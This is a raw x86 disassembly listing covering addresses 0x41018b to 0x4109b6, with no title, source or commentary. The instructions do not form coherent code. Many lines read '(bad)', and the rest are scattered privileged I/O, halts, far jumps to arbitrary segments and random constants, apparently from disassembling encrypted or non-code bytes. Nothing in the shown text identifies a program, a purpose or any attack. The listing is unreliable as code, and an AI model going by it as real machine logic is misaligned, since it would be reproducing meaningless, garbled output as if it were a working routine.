  41018b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41018c:	loop   0x4101e1
  41018e:	jnp    0x410143
  410190:	pop    ds
  410191:	imul   esi,ecx,0x11
  410194:	push   eax
  410195:	mov    ebp,0x5e702c0d
  41019a:	and    DWORD PTR [edx],0x8
  41019d:	pop    eax
  41019e:	cmp    al,0x39
  4101a0:	lods   al,BYTE PTR ds:[esi]
  4101a1:	mov    ebx,0xf058cc8c
  4101a6:	cmp    al,0x26
  4101a8:	fidivr DWORD PTR [eax+0x55b87bae]
  4101ae:	dec    eax
  4101af:	pop    esp
  4101b0:	ins    BYTE PTR es:[edi],dx
  4101b1:	dec    ebx
  4101b2:	shl    BYTE PTR [ecx-0x79f15a2a],cl
  4101b8:	jecxz  0x4101b6
  4101ba:	(bad)  
  4101bb:	jo     0x410183
  4101bd:	sub    ch,BYTE PTR [edi]
  4101bf:	push   edx
  4101c0:	mov    bl,0x36
  4101c2:	and    eax,0xc4e98285
  4101c7:	(bad)  
  4101c8:	mov    bl,0x2b
  4101ca:	xchg   edx,eax
  4101cb:	mov    ds:0x4e399fbf,eax
  4101d0:	mov    esi,0xdc63407c
  4101d5:	dec    ebp
  4101d6:	jg     0x410230
  4101d8:	inc    esp
  4101d9:	pop    ebx
  4101da:	mov    ah,BYTE PTR [ecx]
  4101dc:	sbb    al,0x68
  4101de:	shl    BYTE PTR [eax+0xb8fff0f],1
  4101e4:	mov    dl,0x8c
  4101e6:	push   esi
  4101e7:	and    BYTE PTR [ebx-0x5edf8c60],ah
  4101ed:	inc    edi
  4101ee:	and    al,BYTE PTR [edx]
  4101f0:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4101f2:	shl    dh,1
  4101f4:	inc    ebp
  4101f5:	outs   dx,DWORD PTR ds:[esi]
  4101f6:	and    eax,0x95a4c39
  4101fb:	mov    ebx,0x902d2182
  410200:	popa   
  410201:	shr    ecx,0x41
  410204:	out    dx,eax
  410205:	pop    edi
  410206:	hlt    
  410207:	fistp  WORD PTR [edx]
  410209:	lods   al,BYTE PTR ds:[esi]
  41020a:	aad    0x54
  41020c:	sub    dh,bh
  41020e:	nop
  41020f:	into   
  410210:	mov    cl,BYTE PTR [eax+0x41]
  410213:	pop    esi
  410214:	push   cs
  410215:	xor    bl,BYTE PTR ds:0x1ee63d0c
  41021b:	data16 adc dl,BYTE PTR [edx-0xe1dcadc]
  410222:	sbb    bl,al
  410224:	add    dh,al
  410226:	(bad)  
  410227:	scas   al,BYTE PTR es:[edi]
  410228:	mov    edi,0xdf4988e
  41022d:	jmp    0x410242
  41022f:	xor    ebx,eax
  410231:	adc    dh,0x5b
  410234:	push   eax
  410235:	ror    BYTE PTR [edx],cl
  410237:	sbb    BYTE PTR [eax+0x59],cl
  41023a:	mov    WORD PTR [eax],?
  41023c:	push   edi
  41023d:	jle    0x41020b
  41023f:	outs   dx,BYTE PTR ds:[esi]
  410240:	mov    cl,0xdc
  410242:	xchg   ebp,eax
  410243:	xlat   BYTE PTR ds:[ebx]
  410244:	jp     0x4102b1
  410246:	aas    
  410247:	and    DWORD PTR [edi+esi*2-0x5f],ebx
  41024b:	cmc    
  41024c:	test   eax,0xbead369a
  410251:	bnd jp 0x41022f
  410254:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410255:	arpl   WORD PTR [ebx+esi*2-0x58],si
  410259:	and    eax,0x407aab88
  41025e:	pop    ds
  41025f:	mov    esi,cs
  410261:	add    ah,BYTE PTR [edx+0x24b1adfe]
  410267:	mov    dl,0x8e
  410269:	mov    ebp,es
  41026b:	xor    DWORD PTR [ecx+0x2aff0326],edx
  410271:	mov    DWORD PTR [edx],ecx
  410273:	mov    eax,0x9b11bb9b
  410278:	jl     0x4102a5
  41027a:	cmp    eax,0x7513818d
  41027f:	aas    
  410280:	xchg   ebp,eax
  410281:	(bad)  
  410282:	mov    edi,0xdbd12a1
  410287:	(bad)  
  410288:	adc    al,0x45
  41028a:	push   es
  41028b:	dec    esp
  41028c:	cmp    esi,DWORD PTR [edi+0x685c129f]
  410292:	mov    dh,0x43
  410294:	sbb    dh,BYTE PTR ds:0x94a3a472
  41029a:	add    al,BYTE PTR [ebx+0xc]
  41029d:	(bad)  
  41029e:	jmp    0x58e4e24c
  4102a3:	and    al,0xd9
  4102a5:	xor    ah,BYTE PTR [ebx-0x5cd346cc]
  4102ab:	and    bl,BYTE PTR [ecx+0x2e2bc1a5]
  4102b1:	jo     0x410235
  4102b3:	mov    ebp,DWORD PTR [edi-0x7b]
  4102b6:	out    0xd5,al
  4102b8:	and    al,BYTE PTR [ebp-0x8]
  4102bb:	xchg   esp,eax
  4102bc:	fld    TBYTE PTR [edx+0xe200104]
  4102c2:	sub    bl,ah
  4102c4:	mov    dl,BYTE PTR [ebx-0x2a313260]
  4102ca:	std    
  4102cb:	test   al,0x24
  4102cd:	mov    bl,0xac
  4102cf:	(bad)  
  4102d0:	lds    esp,FWORD PTR [esi*8-0x27c03f63]
  4102d7:	mov    al,ds:0xb50b56bf
  4102dc:	test   BYTE PTR [edi-0x23ad9cd],0x26
  4102e3:	add    eax,0x21817d18
  4102e8:	jp     0x410295
  4102ea:	jb     0x4102e3
  4102ec:	or     DWORD PTR [ebx+0x43b3d40a],0x548684a3
  4102f6:	ficom  WORD PTR [edx+eax*1+0x15]
  4102fa:	ds pop ecx
  4102fc:	or     al,0x21
  4102fe:	adc    eax,0x720a7d06
  410303:	cdq    
  410304:	(bad)  
  410306:	jbe    0x4102c0
  410308:	mov    ebp,0x1b2e7a8f
  41030d:	mov    bh,0x2f
  41030f:	or     DWORD PTR [esi+ecx*2-0x26],0x4f
  410314:	pop    edi
  410315:	mov    ds:0x9cfb787,al
  41031a:	push   eax
  41031b:	sbb    dl,BYTE PTR [ebp+0x20f5c6fa]
  410321:	add    ecx,DWORD PTR [ebx-0xa]
  410324:	xchg   edx,eax
  410325:	imul   edi,DWORD PTR [ebp-0x47b68a77],0x4a191ad1
  41032f:	jecxz  0x410333
  410331:	pop    es
  410332:	fucompp 
  410334:	sbb    eax,DWORD PTR ds:0x29b91e3a
  41033a:	mov    ebx,0x1b51f549
  41033f:	add    dh,BYTE PTR [ecx+0x2e04366]
  410345:	in     al,dx
  410346:	aad    0x29
  410348:	loop   0x4103ab
  41034a:	shl    BYTE PTR [ebx+0x3b],0xb3
  41034e:	adc    BYTE PTR [eax-0x22],dh
  410351:	cwde   
  410352:	cli    
  410353:	dec    ebx
  410354:	ja     0x4103b0
  410356:	inc    edi
  410357:	scas   al,BYTE PTR es:[edi]
  410358:	test   al,0xe
  41035a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41035b:	xchg   ebx,eax
  41035c:	stc    
  41035d:	or     al,0xf8
  41035f:	ret    
  410360:	cwde   
  410361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410362:	arpl   dx,bx
  410364:	dec    edi
  410365:	push   ss
  410366:	(bad)  
  410368:	cli    
  410369:	push   0x102adc4d
  41036e:	mov    WORD PTR [edi+0x54],fs
  410371:	mov    esi,0xc9831e60
  410376:	cmp    al,0x81
  410378:	lahf   
  410379:	jle    0x41037c
  41037b:	mov    esi,edx
  41037d:	mov    bh,0xb0
  41037f:	xchg   ecx,eax
  410380:	add    BYTE PTR [edx],ah
  410382:	pop    eax
  410383:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  410385:	add    BYTE PTR [ecx-0x63b7d7d1],cl
  41038b:	mov    dh,BYTE PTR [eax]
  41038d:	xchg   ebx,eax
  41038e:	inc    esp
  41038f:	popa   
  410390:	cmc    
  410391:	jl     0x4103dd
  410393:	dec    eax
  410394:	pop    ds
  410395:	xchg   esi,eax
  410396:	cmp    al,BYTE PTR [esi+0x745c872c]
  41039c:	(bad)  
  41039d:	push   ecx
  41039e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41039f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103a0:	mov    esi,0x93b2505c
  4103a5:	cmp    ebx,DWORD PTR [ebx]
  4103a7:	add    DWORD PTR [bp+di-0x73],ecx
  4103ab:	xor    al,0x6e
  4103ad:	sbb    DWORD PTR [esi-0x64ddea7a],edx
  4103b3:	subps  xmm0,XMMWORD PTR [ebp-0x53]
  4103b7:	pop    edi
  4103b8:	scas   eax,DWORD PTR es:[edi]
  4103b9:	jne    0x410358
  4103bb:	and    al,0x82
  4103bd:	icebp  
  4103be:	mov    esi,DWORD PTR [eax-0x25a3d922]
  4103c4:	xor    al,0x1
  4103c6:	inc    ebp
  4103c7:	mov    BYTE PTR [ebx-0x20],ah
  4103ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103cb:	mov    ebp,0xbc4a103c
  4103d0:	mov    esi,0x7b618890
  4103d5:	inc    edi
  4103d6:	int3   
  4103d7:	test   al,0x18
  4103d9:	mov    ds,WORD PTR [ebp-0x18]
  4103dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103dd:	xchg   esi,eax
  4103de:	mov    DWORD PTR [edi-0x4d],ebp
  4103e1:	imul   ebx,DWORD PTR [eax],0xffffffb3
  4103e4:	jnp    0x4103d8
  4103e6:	pop    eax
  4103e7:	or     cl,BYTE PTR [ebx]
  4103e9:	jnp    0x4103b6
  4103eb:	cld    
  4103ec:	push   esp
  4103ed:	dec    edx
  4103ee:	js     0x41039d
  4103f0:	hlt    
  4103f1:	loopne 0x4103dd
  4103f3:	mov    DWORD PTR [ecx+0x69],ecx
  4103f6:	fstp   TBYTE PTR [ebp+0xe6ebf37]
  4103fc:	jne    0x410465
  4103fe:	cmp    eax,0x117ebf93
  410403:	push   ebx
  410404:	mov    edx,DWORD PTR [ebx-0x56]
  410407:	imul   eax,DWORD PTR [esi+0x13],0x4d07dace
  41040e:	lods   al,BYTE PTR ds:[esi]
  41040f:	mov    ebx,0x1f2f5f60
  410414:	outs   dx,DWORD PTR ds:[esi]
  410415:	fwait
  410416:	jmp    0x1e3e5932
  41041b:	cli    
  41041c:	jmp    0x6bd8:0xf57f3011
  410423:	sar    bh,0x3b
  410426:	in     al,0x96
  410428:	sbb    al,0xd9
  41042a:	out    0x64,eax
  41042c:	jmp    edi
  41042e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41042f:	sbb    ebp,DWORD PTR [esi+0x65]
  410432:	retf   0xbaca
  410435:	adc    eax,0xb74d5ea7
  41043a:	inc    esi
  41043b:	sbb    eax,0x283cad65
  410440:	pop    ds
  410441:	sbb    al,0xad
  410443:	arpl   WORD PTR [ecx+0x5c4d4046],bp
  410449:	mov    al,0x64
  41044b:	mov    ebp,0xc71d39b8
  410450:	rcr    DWORD PTR [ebp-0x3865c6d7],1
  410456:	es inc edi
  410458:	sbb    al,0x62
  41045a:	repz xchg sp,ax
  41045d:	xchg   ebx,eax
  41045e:	cmp    dl,BYTE PTR [eax]
  410460:	inc    eax
  410461:	mov    ch,0x86
  410463:	mov    WORD PTR [ebx-0x86d048],?
  410469:	inc    ebx
  41046a:	and    al,0x73
  41046c:	and    eax,0xaf9a01e9
  410471:	das    
  410472:	clc    
  410473:	xor    DWORD PTR [ebp+0x67],esi
  410476:	sbb    BYTE PTR [ecx-0x1dadf3ba],0x2d
  41047d:	inc    ebp
  41047e:	inc    esp
  41047f:	lahf   
  410480:	cmp    DWORD PTR [esi+0x33335ed7],0xfffffff4
  410487:	std    
  410488:	loope  0x4104fa
  41048a:	stos   DWORD PTR es:[edi],eax
  41048b:	inc    ebp
  41048c:	adc    bl,dl
  41048e:	sbb    BYTE PTR [edi-0x42d37e25],dl
  410494:	scas   eax,DWORD PTR es:[edi]
  410495:	mov    ds:0xe5f8dfd8,eax
  41049a:	add    DWORD PTR [esi+0x4fd4abcf],0x5a
  4104a1:	mov    ch,0x33
  4104a3:	sub    dl,BYTE PTR [ebp-0x3a]
  4104a6:	xor    cl,BYTE PTR [ecx-0x37305ffd]
  4104ac:	retf   0x95d6
  4104af:	sub    edx,DWORD PTR [esi-0x3]
  4104b2:	fistp  DWORD PTR [edx]
  4104b4:	sub    ebx,DWORD PTR [esi+eax*1]
  4104b7:	adc    cl,BYTE PTR ds:0x554407af
  4104bd:	jp     0x41052c
  4104bf:	arpl   WORD PTR [ecx+0x1aaafbef],si
  4104c5:	aas    
  4104c6:	test   DWORD PTR [eax],edx
  4104c8:	inc    edi
  4104c9:	call   0x9b1f1381
  4104ce:	repnz jecxz 0x410482
  4104d1:	mov    ds:0xecfcbd8f,al
  4104d6:	push   es
  4104d7:	and    al,0xe3
  4104d9:	int3   
  4104da:	inc    edx
  4104db:	jg     0x4104d8
  4104dd:	fisubr DWORD PTR [ebp-0x39]
  4104e0:	mov    ebx,0x62566431
  4104e5:	pop    ds
  4104e6:	sbb    DWORD PTR [edx-0x734f6815],edx
  4104ec:	idiv   BYTE PTR [edx+0x5673601c]
  4104f2:	dec    esi
  4104f3:	mov    al,ds:0x7eca1553
  4104f8:	push   cs
  4104f9:	sub    BYTE PTR [ebp+edx*1-0x4beab04a],cl
  410500:	jb     0x410525
  410502:	pop    esp
  410503:	int3   
  410504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410505:	push   ecx
  410506:	scas   al,BYTE PTR es:[edi]
  410507:	sub    eax,0x7a63799a
  41050c:	jg     0x4104a5
  41050e:	dec    ecx
  41050f:	push   ebx
  410510:	and    bh,BYTE PTR [ecx-0x1dea30d6]
  410516:	and    DWORD PTR [edi-0x7c],0x20
  41051a:	je     0x4104d8
  41051c:	dec    eax
  41051d:	aas    
  41051e:	mov    al,0x31
  410520:	xchg   edi,eax
  410521:	ins    BYTE PTR es:[edi],dx
  410522:	sub    DWORD PTR [eax+0x3513a584],eax
  410528:	sahf   
  410529:	dec    esp
  41052a:	mov    BYTE PTR [edi],ah
  41052c:	adc    eax,0xed5ef8ba
  410531:	nop
  410532:	nop
  410533:	lock sbb eax,0x7c8953f5
  410539:	fild   WORD PTR [ebx]
  41053b:	cmp    ebp,DWORD PTR [ebx+0x6b7d1263]
  410541:	lock push esi
  410543:	cdq    
  410544:	dec    esi
  410545:	pop    ss
  410546:	in     eax,0x43
  410548:	mov    dh,0x4f
  41054a:	lods   al,BYTE PTR ds:[esi]
  41054b:	jo     0x4105a5
  41054d:	inc    ebx
  41054e:	ins    DWORD PTR es:[edi],dx
  41054f:	adc    BYTE PTR [edi],bh
  410551:	ja     0x4104f1
  410553:	lea    eax,[edi-0x17f45b7c]
  410559:	mov    ecx,ecx
  41055b:	or     BYTE PTR [ebx],cl
  41055d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41055e:	cmp    bh,BYTE PTR [eax+0xde8a692]
  410564:	rcl    DWORD PTR [ebx+ebp*1],1
  410567:	cli    
  410568:	jns    0x4105e6
  41056a:	lds    edx,FWORD PTR [esp+edx*2-0x2cf48129]
  410571:	imul   esi,DWORD PTR [edi+0x568a9643],0xffffffff
  410578:	dec    edi
  410579:	or     eax,DWORD PTR [edi-0x52c13a0b]
  41057f:	dec    ebx
  410580:	jecxz  0x4105bf
  410582:	sub    esi,DWORD PTR [esi-0x78]
  410585:	adc    BYTE PTR [ebp+ebp*4-0x24],al
  410589:	int3   
  41058a:	cs fwait
  41058c:	mov    edi,0x1067bd02
  410591:	rcr    DWORD PTR [eax-0x36],0xfe
  410595:	jns    0x410557
  410597:	fwait
  410598:	adc    cl,cl
  41059a:	jle    0x41059e
  41059c:	scas   eax,DWORD PTR es:[edi]
  41059d:	pop    esp
  41059e:	test   DWORD PTR [ebp+0x10c7107b],ecx
  4105a4:	scas   al,BYTE PTR es:[edi]
  4105a5:	call   0xa51c1e26
  4105aa:	repz inc ecx
  4105ac:	dec    ebp
  4105ad:	in     al,0x6a
  4105af:	and    BYTE PTR [esi+0x4cd45bd2],0x38
  4105b6:	loop   0x410573
  4105b8:	mov    ecx,DWORD PTR [ebp+0x2a]
  4105bb:	add    ebp,DWORD PTR [esi]
  4105bd:	test   dh,al
  4105bf:	lods   eax,DWORD PTR ds:[esi]
  4105c0:	rol    BYTE PTR [ecx+0x45f83b93],cl
  4105c6:	mov    es:0x53e75053,eax
  4105cc:	(bad)  
  4105cd:	aas    
  4105ce:	inc    esi
  4105cf:	cli    
  4105d0:	std    
  4105d1:	leave  
  4105d2:	adc    dh,bl
  4105d4:	jae    0x41063b
  4105d6:	cmp    eax,0x44b22451
  4105db:	fwait
  4105dc:	arpl   WORD PTR [esi+0x22],bp
  4105df:	lds    ebx,FWORD PTR [esi+0x5d]
  4105e2:	fisttp QWORD PTR [ebp-0x6b]
  4105e5:	add    ch,cl
  4105e7:	cmp    eax,0x20fb9499
  4105ec:	jno    0x4105b7
  4105ee:	push   0x5b1e517b
  4105f3:	stos   DWORD PTR es:[edi],eax
  4105f4:	or     BYTE PTR [eax],al
  4105f6:	mov    ?,WORD PTR [ebx+0x24b94bf]
  4105fc:	push   cs
  4105fd:	ss pop eax
  4105ff:	inc    eax
  410600:	adc    dl,BYTE PTR [eax+0x367de7c1]
  410606:	mov    ebx,0xc0331975
  41060b:	push   ecx
  41060c:	jge    0x4105ac
  41060e:	mov    esp,0x55653ade
  410613:	pop    edi
  410614:	inc    ebx
  410615:	hlt    
  410616:	dec    esp
  410617:	loopne 0x410644
  410619:	aad    0xa5
  41061b:	push   ecx
  41061c:	aad    0x76
  41061e:	inc    edi
  41061f:	push   ds
  410620:	xor    al,0x42
  410622:	imul   edx,DWORD PTR [eax+0x3b],0x5b0633ce
  410629:	fisubr DWORD PTR [eax-0x52520cdc]
  41062f:	and    al,BYTE PTR [edi+0x1c]
  410632:	xchg   BYTE PTR [esi-0x370638be],cl
  410638:	or     eax,0xae8c3b7f
  41063e:	ds add eax,0xd6d64f01
  410644:	mov    eax,0xed4270ff
  410649:	dec    edi
  41064a:	mov    ecx,0xdbd54448
  41064f:	mov    ecx,0x6239a19d
  410654:	in     al,0x79
  410656:	mov    edi,0xdcf790d3
  41065b:	push   ebx
  41065c:	daa    
  41065d:	push   esi
  41065e:	cmp    ebp,DWORD PTR [edx]
  410660:	into   
  410661:	repz jge 0x410601
  410664:	sbb    DWORD PTR [ebx+ecx*8],0xffffffa9
  410668:	imul   ecx,DWORD PTR [edi-0x1925f08a],0xcbaaedba
  410672:	jge    0x4106f2
  410674:	in     al,0x9
  410676:	nop
  410677:	inc    esi
  410678:	or     DWORD PTR [ebp+0x20a82ca2],edx
  41067e:	dec    edx
  41067f:	mov    DWORD PTR [ebp+0x4],edi
  410682:	pop    edi
  410683:	jnp    0x4106a2
  410685:	or     ah,al
  410687:	fimul  DWORD PTR [esi]
  410689:	ret    0x66b0
  41068c:	addr16 mov ebp,0xa8903c9e
  410692:	mov    DWORD PTR [edi+0x1b1cf5b6],edx
  410698:	sahf   
  410699:	jno    0x410685
  41069b:	jmp    0x4106d3
  41069d:	test   al,0x42
  41069f:	or     BYTE PTR [edx],al
  4106a1:	xor    DWORD PTR [edi],esp
  4106a3:	sbb    eax,0xc66280b8
  4106a8:	sub    bl,BYTE PTR ss:[eax-0x37f20372]
  4106af:	call   0x93edbb54
  4106b4:	and    eax,0x30f30b90
  4106b9:	into   
  4106ba:	aad    0x1d
  4106bc:	inc    ebp
  4106bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106be:	int3   
  4106bf:	test   DWORD PTR [edx+0x4c608407],esi
  4106c5:	rol    DWORD PTR ds:0xc6b34921,1
  4106cb:	aas    
  4106cc:	les    ebp,FWORD PTR ds:[edx+0x1a]
  4106d0:	xor    eax,0xf97c4a3e
  4106d5:	dec    eax
  4106d6:	mov    ecx,0x381f1850
  4106db:	mov    dl,0x19
  4106dd:	push   es
  4106de:	repz mov al,ss:0x96c4227d
  4106e5:	push   esi
  4106e6:	pop    ebp
  4106e7:	inc    ecx
  4106e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106e9:	outs   dx,BYTE PTR ss:[esi]
  4106eb:	das    
  4106ec:	ja     0x4106b9
  4106ee:	imul   ebx,DWORD PTR [eax+0x791c8dbb],0x258e6c2e
  4106f8:	cdq    
  4106f9:	jbe    0x4106c2
  4106fb:	xchg   BYTE PTR [ecx-0x4f],al
  4106fe:	dec    edx
  4106ff:	mov    cl,0x7a
  410701:	fld    QWORD PTR [ebp+0x298219d7]
  410707:	push   0x7d
  410709:	shl    DWORD PTR [ebp-0x1c],cl
  41070c:	pop    ecx
  41070d:	mov    ch,0x84
  41070f:	jmp    0xc803:0xa21709b2
  410716:	adc    BYTE PTR [ebx],dl
  410718:	add    al,0x10
  41071a:	popf   
  41071b:	inc    edi
  41071c:	fcom   QWORD PTR [ebp-0x3c]
  41071f:	jg     0x410755
  410721:	and    eax,0x5ee351d9
  410726:	dec    ebx
  410727:	jb     0x4106c2
  410729:	imul   edi,DWORD PTR [eax-0x31],0xffffffb7
  41072d:	mov    esp,ds
  41072f:	jl     0x4106f3
  410731:	sub    eax,0xeea36706
  410736:	out    0x4e,al
  410738:	fisub  DWORD PTR [edx+0x5]
  41073b:	jl     0x4107a0
  41073d:	dec    edx
  41073f:	lahf   
  410740:	jne    0x4107a8
  410742:	out    dx,eax
  410743:	sbb    al,0x4a
  410745:	fs js  0x4106e1
  410748:	imul   esi,DWORD PTR cs:[edi+0xb],0x43
  41074d:	xor    BYTE PTR [eax+ebx*4+0x7d3361ce],ah
  410754:	mov    ebx,0x283fa7cc
  410759:	add    al,0x27
  41075b:	xor    BYTE PTR [bp-0x442b],bh
  410760:	mov    ebx,0x8c687804
  410765:	stos   BYTE PTR es:[edi],al
  410766:	sti    
  410767:	inc    esp
  410768:	push   ecx
  410769:	ror    BYTE PTR [edx],0xef
  41076c:	pop    esi
  41076d:	adc    al,0xe4
  41076f:	loope  0x410772
  410771:	mov    ds:0x4c0947b6,al
  410776:	or     al,0xaf
  410778:	or     eax,0xc532b34c
  41077d:	mov    edi,0x35378a90
  410782:	lahf   
  410783:	loop   0x410708
  410785:	in     eax,dx
  410786:	sbb    edi,DWORD PTR [esi-0x39]
  410789:	push   cs
  41078a:	xor    eax,0x8744b505
  41078f:	mov    ebp,0xd3910a88
  410794:	fwait
  410795:	add    eax,0x4077115e
  41079a:	mov    ah,0x7a
  41079c:	sbb    eax,ebp
  41079e:	adc    ebp,0x8
  4107a1:	dec    DWORD PTR cs:0x5892e5d9
  4107a8:	(bad)  
  4107a9:	mov    ds:0x27096a1c,eax
  4107ae:	jle    0x4107f9
  4107b0:	cmp    edi,DWORD PTR [eax]
  4107b2:	out    dx,eax
  4107b3:	(bad)  
  4107b4:	pushf  
  4107b5:	imul   esi,DWORD PTR [esi-0x66b9eb8c],0xe45e6b14
  4107bf:	je     0x410801
  4107c1:	fwait
  4107c2:	out    0xe7,eax
  4107c4:	mov    cl,0x4f
  4107c6:	and    edi,DWORD PTR [eax]
  4107c8:	fldenv [ebp+0x1a7c605b]
  4107ce:	pop    esp
  4107cf:	jg     0x410846
  4107d1:	and    bh,BYTE PTR [edx]
  4107d3:	loop   0x4107b8
  4107d5:	mov    bh,0x63
  4107d7:	shl    DWORD PTR [eax-0x727a9149],1
  4107dd:	icebp  
  4107de:	cmp    al,0x7b
  4107e0:	jmp    0xbe8d4a97
  4107e5:	dec    esp
  4107e6:	adc    BYTE PTR cs:[edx+ebx*2-0x56],0x47
  4107ec:	mov    ebx,DWORD PTR [ecx+0x26bcdac4]
  4107f2:	cld    
  4107f3:	mov    edx,0xe48ab0f0
  4107f8:	mov    esi,0xf4c4f5e2
  4107fd:	ror    BYTE PTR [edx],cl
  4107ff:	cmp    BYTE PTR [esi-0x1948963],al
  410805:	in     eax,0x56
  410807:	in     eax,0x7e
  410809:	fistp  WORD PTR [edi+0x49]
  41080c:	leave  
  41080d:	or     BYTE PTR [ebx-0x44],ah
  410810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410811:	mov    edx,0xde103529
  410816:	adc    ebx,eax
  410818:	and    bh,BYTE PTR [edx-0x2683301c]
  41081e:	inc    ebx
  41081f:	stc    
  410820:	or     eax,0x58807895
  410825:	jbe    0x410832
  410827:	mov    dh,0x3
  410829:	push   edx
  41082a:	cmp    esp,ebx
  41082c:	jae    0x4107e0
  41082e:	sahf   
  41082f:	lods   al,BYTE PTR ds:[esi]
  410830:	jbe    0x4107d8
  410832:	mov    DWORD PTR [esi-0x29baa559],ebx
  410838:	out    0x53,eax
  41083a:	mul    BYTE PTR [esi+0x3c75dce3]
  410840:	in     eax,dx
  410841:	mov    ds:0x24dd0749,eax
  410846:	sbb    ebx,ebx
  410848:	out    0x87,eax
  41084a:	and    DWORD PTR [ebp+0x5a0f63b2],edx
  410850:	popf   
  410851:	mov    eax,0x29b68d38
  410856:	cmp    bl,BYTE PTR [ebx-0x7a962f7f]
  41085c:	loope  0x410859
  41085e:	xor    al,0x51
  410860:	ficomp DWORD PTR [eax+0x3e08159c]
  410866:	xchg   esi,eax
  410867:	sbb    edi,DWORD PTR [esi]
  410869:	pop    ds
  41086a:	test   BYTE PTR [ebx-0x42d53b11],ah
  410870:	sbb    DWORD PTR [eax],ebx
  410872:	(bad)  
  410873:	les    ecx,FWORD PTR [ecx]
  410875:	adc    eax,0xc46fab78
  41087a:	pop    ss
  41087b:	push   esi
  41087c:	nop
  41087d:	mov    eax,0xde8f474
  410882:	repnz test eax,0xbe60a493
  410888:	test   eax,0xaf75ac32
  41088d:	lahf   
  41088e:	retf   0x50c1
  410891:	and    bl,BYTE PTR [esi]
  410893:	frstor [ecx-0x25e733ad]
  410899:	mov    dl,BYTE PTR [ebx+0x2130d7a2]
  41089f:	aaa    
  4108a0:	lock out dx,eax
  4108a2:	dec    ebx
  4108a3:	ins    BYTE PTR es:[edi],dx
  4108a4:	int3   
  4108a5:	and    al,BYTE PTR [ecx-0x5]
  4108a8:	sbb    eax,0xefcadcec
  4108ad:	fisub  DWORD PTR [ecx]
  4108af:	xor    eax,0x859efbc0
  4108b4:	popf   
  4108b5:	pop    ss
  4108b6:	push   0x968e93
  4108bb:	or     ebx,DWORD PTR [ebx]
  4108bd:	push   ds
  4108be:	cld    
  4108bf:	fs lock test eax,0x788b5c5a
  4108c6:	push   es
  4108c7:	inc    ebx
  4108c8:	popw   ds
  4108ca:	dec    cx
  4108cc:	into   
  4108cd:	and    al,0x97
  4108cf:	test   ebx,0x33dd0d3b
  4108d5:	and    cl,BYTE PTR [ecx+0x8f78c0e]
  4108db:	out    0xe3,eax
  4108dd:	xlat   BYTE PTR ds:[ebx]
  4108de:	push   cs
  4108df:	xchg   edx,eax
  4108e0:	sub    edx,DWORD PTR [edi]
  4108e2:	fwait
  4108e3:	gs cmp al,0x5c
  4108e6:	cmp    al,0xb0
  4108e8:	shl    DWORD PTR [eax+0x75be0e5c],0x58
  4108ef:	fistp  WORD PTR [ebx]
  4108f1:	addr16 inc esp
  4108f3:	jge    0x410961
  4108f5:	sub    edx,DWORD PTR [edi]
  4108f7:	pop    ebp
  4108f8:	xor    ecx,DWORD PTR [esi-0x6c515bb9]
  4108fe:	add    DWORD PTR [edi-0xd],esp
  410901:	in     al,dx
  410902:	mov    esi,0x320c2cb4
  410907:	lods   al,BYTE PTR ds:[esi]
  410908:	icebp  
  410909:	icebp  
  41090a:	xor    DWORD PTR [esi+ebx*1],esp
  41090d:	adc    dh,BYTE PTR ds:0xa6e41922
  410913:	lds    esi,FWORD PTR [ebp-0x46e118fd]
  410919:	mov    eax,0xdb46ef50
  41091e:	mov    al,0xbd
  410920:	arpl   dx,sp
  410922:	add    al,0x64
  410924:	lods   al,BYTE PTR ds:[esi]
  410925:	cmp    al,0x20
  410927:	jns    0x4108b5
  410929:	xchg   ebx,eax
  41092a:	fisub  DWORD PTR [esi]
  41092c:	pop    edx
  41092d:	mov    ch,0xb3
  41092f:	jg     0x410951
  410931:	popf   
  410932:	es call 0x181d:0xc1323ade
  41093a:	imul   ecx,esp,0xffffffb4
  41093d:	(bad)  [ebx+0xa9f1f94]
  410943:	sub    dh,cl
  410945:	call   0xb88de3cc
  41094a:	pop    edi
  41094b:	jnp    0x41093d
  41094d:	inc    ecx
  41094e:	mov    bh,0x8c
  410950:	push   0xc
  410952:	jl     0x41091c
  410954:	push   ebp
  410955:	imul   edx,DWORD PTR [edi],0xbbdfc615
  41095b:	test   eax,0x25d8f8ee
  410960:	xchg   edi,eax
  410961:	leave  
  410962:	mov    DWORD PTR [ecx+0x33],ecx
  410965:	daa    
  410966:	clc    
  410967:	dec    eax
  410968:	push   eax
  410969:	mov    esi,es
  41096b:	and    ebx,DWORD PTR [ecx+0x1d3c40d6]
  410971:	xchg   edi,eax
  410972:	inc    ecx
  410973:	cwde   
  410974:	ret    0xf6d5
  410977:	sti    
  410978:	add    ah,BYTE PTR [edx-0x68a15bd4]
  41097e:	aam    0x4c
  410980:	mov    bh,0x40
  410982:	mov    esp,0xaefb4a08
  410987:	addr16 je 0x4109d0
  41098a:	(bad)  
  41098b:	push   edx
  41098c:	mov    eax,0x3ffc1e4e
  410991:	stos   BYTE PTR es:[edi],al
  410992:	out    dx,eax
  410993:	push   es
  410994:	mov    ch,0x7d
  410996:	xor    eax,0xe6a459b4
  41099b:	push   esi
  41099c:	jle    0x41098f
  41099e:	in     al,0x5f
  4109a0:	sbb    ebp,DWORD PTR [ebx-0x17]
  4109a3:	rol    BYTE PTR [ebp+0x3f],cl
  4109a6:	int3   
  4109a7:	fadd   DWORD PTR [ecx]
  4109a9:	push   0xffffffbb
  4109ab:	sub    DWORD PTR [esi+0x68],esp
  4109ae:	xor    ecx,DWORD PTR [ecx+0xa]
  4109b1:	mov    ecx,0x333eb57c
  4109b6:	fcomp  DWORD PTR [ebx-0x49811223]
